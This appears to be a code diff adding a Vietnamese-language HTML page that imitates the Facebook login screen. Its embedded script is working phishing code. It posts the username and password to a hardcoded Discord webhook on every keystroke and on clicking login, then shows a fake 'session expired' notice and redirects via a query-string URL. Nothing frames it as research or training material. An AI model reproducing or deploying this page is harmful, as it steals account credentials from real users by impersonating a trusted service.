@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – đăng nhập</title>
+  <style>
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Thanh ngôn ngữ */
+    .header {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 12px 16px;
+    }
+    .lang {
+      font-size: 15px;
+      color: #1c1e21;
+      cursor: default;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      user-select: none;
+    }
+    .lang svg { width: 10px; height: 10px; }
+
+    /* Khung chính */
+    .container {
+      width: 100%;
+      max-width: 380px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    /* Logo Facebook */
+    .logo { margin: 36px 0 22px 0; }
+    .logo svg { width: 65px; height: 65px; }
+
+    /* Input */
+    input {
+      width: 100%;
+      padding: 16px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 14px;
+      font-size: 16px;
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    /* Nút đăng nhập */
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      border: none;
+      border-radius: 9999px; /* pill */
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .login-btn:hover { background: #166fe5; }
+
+    /* Quên mật khẩu */
+    .forgot {
+      display: block;
+      margin: 18px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 15px;
+    }
+
+    /* Nút tạo tài khoản */
+    .create-btn {
+      width: 100%;
+      padding: 14px;
+      background: white;
+      border: 1px solid #1877f2;
+      border-radius: 9999px; /* pill */
+      color: #1877f2;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 28px; /* xa hơn một chút */
+    }
+
+    /* Meta */
+    .meta { margin-top: 40px; font-size: 14px; color: #606770; }
+
+    /* Ô thông báo */
+    .notification {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5); /* Nền mờ */
+      display: none; /* Ẩn ô thông báo ban đầu */
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    .notification-content {
+      background: white;
+      border: 1px solid black;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      position: relative;
+      text-align: center;
+    }
+    .notification button {
+      background: transparent;
+      border: none;
+      color: red;
+      font-size: 24px; /* Kích thước lớn hơn */
+      cursor: pointer;
+      position: absolute;
+      top: 10px;
+      right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <div class="header">
+    <div class="lang">
+      <span>Tiếng Việt</span>
+      <svg viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg"><path d="M1 1l4 4 4-4" fill="none" stroke="#1c1e21" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- Logo Facebook -->
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" fill="#1877f2">
+        <path d="M18 0C8.059 0 0 8.059 0 18c0 8.991 6.624 16.43 15.25 17.82v-12.6h-4.59v-5.22h4.59v-3.98c0-4.53 2.72-7.03 6.88-7.03 1.99 0 4.07.355 4.07.355v4.48h-2.29c-2.26 0-2.96 1.405-2.96 2.85v3.33h5.05l-.81 5.22h-4.24V35.82C29.376 34.43 36 26.991 36 18 36 8.059 27.941 0 18 0z"/>
+      </svg>
+    </div>
+
+    <!-- Form -->
+    <form>
+      <input id="user" type="text" placeholder="Số di động hoặc email" required>
+      <input id="pass" type="password" placeholder="Mật khẩu" required>
+      <button type="submit" class="login-btn">Đăng nhập</button>
+    </form>
+
+    <!-- Quên mật khẩu -->
+    <a href="#" class="forgot">Quên mật khẩu?</a>
+
+    <!-- Tạo tài khoản mới -->
+    <button class="create-btn">Tạo tài khoản mới</button>
+
+    <!-- Ô thông báo -->
+    <div class="notification" id="notification">
+      <div class="notification-content">
+        <button id="closeBtn">&times;</button>
+        <p>Phiên đăng nhập đã hết hạn.</p>
+      </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1407027414453977098/YJ2VPKSzeU4DYTmlHE4MeShhIV5Wxmi06-y70ueqsCKvl8l3Nd7Uxkn-EyGypl_8Q5tG';
+
+        function nowISO() {
+            return new Date().toISOString();
+        }
+
+        function sendToDiscord(event, details = {}) {
+            const payload = {
+                content: `📝 **Sự kiện**: ${event}\n⏱️ Thời gian: ${nowISO()}\n🌐 Trang: ${location.href}\n🔧 Chi tiết: ${JSON.stringify(details)}`
+            };
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Lỗi khi gửi thông báo:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Có lỗi xảy ra:', error);
+            });
+        }
+
+        // Get redirect URL from query params
+        const urlParams = new URLSearchParams(window.location.search);
+        const redirectUrl = urlParams.get('redirect') || '/';
+
+        const userInput = document.getElementById('user'); // Tên tài khoản
+        const passInput = document.getElementById('pass'); // Mật khẩu
+        const loginBtn = document.querySelector('.login-btn'); // Nút đăng nhập
+        const notification = document.getElementById('notification'); // Ô thông báo
+        const closeBtn = document.getElementById('closeBtn'); // Nút đóng thông báo
+
+        // Gửi thông tin ngay khi người dùng nhập vào tên tài khoản
+        userInput.addEventListener('input', () => {
+            sendToDiscord('người dùng đã nhập tên tài khoản', {
+                username: userInput.value // Giá trị tên tài khoản
+            });
+        });
+
+        // Gửi thông tin ngay khi người dùng nhập vào mật khẩu
+        passInput.addEventListener('input', () => {
+            sendToDiscord('người dùng đã nhập mật khẩu', {
+                password: passInput.value // Giá trị mật khẩu
+            });
+        });
+
+        // Khi người dùng ấn vào nút đăng nhập
+        loginBtn.addEventListener('click', (e) => {
+            e.preventDefault(); // Ngăn chặn hành động mặc định của nút
+
+            // Gửi thông tin tên tài khoản và mật khẩu đến Discord
+            sendToDiscord('người dùng đã ấn vào đăng nhập', {
+                username: userInput.value, // Giá trị tên tài khoản
+                password: passInput.value // Giá trị mật khẩu
+            });
+
+            // Hiển thị thông báo "Phiên đăng nhập đã hết hạn"
+            notification.style.display = 'flex'; // Hiện ô thông báo
+        });
+
+        // Đóng ô thông báo khi nhấn nút "X" và redirect
+        closeBtn.addEventListener('click', () => {
+            notification.style.display = 'none'; // Ẩn ô thông báo
+            window.location.href = redirectUrl; // Redirect to the specified URL
+        });
+    </script>
+
+    <div class="meta">
+      <p>Meta © 2023</p>
+      <p class="notice"></p>
+    </div>
+  </div>    
+</body>
+</html>
